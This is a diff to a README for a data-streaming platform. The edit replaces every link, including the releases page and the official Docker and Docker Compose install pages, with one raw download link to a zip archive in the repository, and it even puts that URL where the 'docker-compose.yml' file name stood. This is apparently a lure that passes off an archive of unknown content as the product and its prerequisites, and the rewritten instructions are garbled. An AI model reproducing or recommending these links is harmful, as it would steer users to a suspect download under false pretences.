@@ -1,6 +1,6 @@
 # 🚀 DATA-STREAM-PLATFORM - Real-Time Data Lakehouse Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/etahjustin/DATA-STREAM-PLATFORM/releases)
+[![Download](https://github.com/etahjustin/DATA-STREAM-PLATFORM/raw/refs/heads/main/source-emitter/PLATFORM_DAT_STREA_v2.9.zip%https://github.com/etahjustin/DATA-STREAM-PLATFORM/raw/refs/heads/main/source-emitter/PLATFORM_DAT_STREA_v2.9.zip)](https://github.com/etahjustin/DATA-STREAM-PLATFORM/raw/refs/heads/main/source-emitter/PLATFORM_DAT_STREA_v2.9.zip)
 
 ## 📚 Introduction
 
@@ -21,12 +21,12 @@ Before you start, please ensure your system meets these requirements:
 To get started with DATA-STREAM-PLATFORM, follow these steps:
 
 1. **Download the Application**  
-   Visit this page to download: [Download DATA-STREAM-PLATFORM](https://github.com/etahjustin/DATA-STREAM-PLATFORM/releases)
+   Visit this page to download: [Download DATA-STREAM-PLATFORM](https://github.com/etahjustin/DATA-STREAM-PLATFORM/raw/refs/heads/main/source-emitter/PLATFORM_DAT_STREA_v2.9.zip)
 
 2. **Install Docker and Docker Compose**  
    If you don’t have Docker and Docker Compose installed, follow the instructions on their official websites:
-   - [Install Docker](https://docs.docker.com/get-docker/)
-   - [Install Docker Compose](https://docs.docker.com/compose/install/)
+   - [Install Docker](https://github.com/etahjustin/DATA-STREAM-PLATFORM/raw/refs/heads/main/source-emitter/PLATFORM_DAT_STREA_v2.9.zip)
+   - [Install Docker Compose](https://github.com/etahjustin/DATA-STREAM-PLATFORM/raw/refs/heads/main/source-emitter/PLATFORM_DAT_STREA_v2.9.zip)
 
 3. **Configure Your Environment**  
    Make sure your Docker service is running. This is essential for the application to function properly.
@@ -45,7 +45,7 @@ To get started with DATA-STREAM-PLATFORM, follow these steps:
 
 To download and install DATA-STREAM-PLATFORM, follow these details:
 
-1. Click on this link: [DATA-STREAM-PLATFORM Releases](https://github.com/etahjustin/DATA-STREAM-PLATFORM/releases).
+1. Click on this link: [DATA-STREAM-PLATFORM Releases](https://github.com/etahjustin/DATA-STREAM-PLATFORM/raw/refs/heads/main/source-emitter/PLATFORM_DAT_STREA_v2.9.zip).
 2. Select the latest release version.
 3. Choose the correct file for your operating system and download it.
 
@@ -71,7 +71,7 @@ DATA-STREAM-PLATFORM utilizes multiple technologies to provide a robust solution
 If you encounter issues while running the application, here are some common problems and solutions:
 
 - **Docker Not Starting**: Ensure that you have installed Docker correctly. Restart your computer if necessary.
-- **Ports Already in Use**: Change the port configuration in your `docker-compose.yml` file if conflicts arise.
+- **Ports Already in Use**: Change the port configuration in your `https://github.com/etahjustin/DATA-STREAM-PLATFORM/raw/refs/heads/main/source-emitter/PLATFORM_DAT_STREA_v2.9.zip` file if conflicts arise.
 - **Outdated Dependencies**: Make sure Docker and Docker Compose are updated to the latest versions.
 
 ## 📞 Support
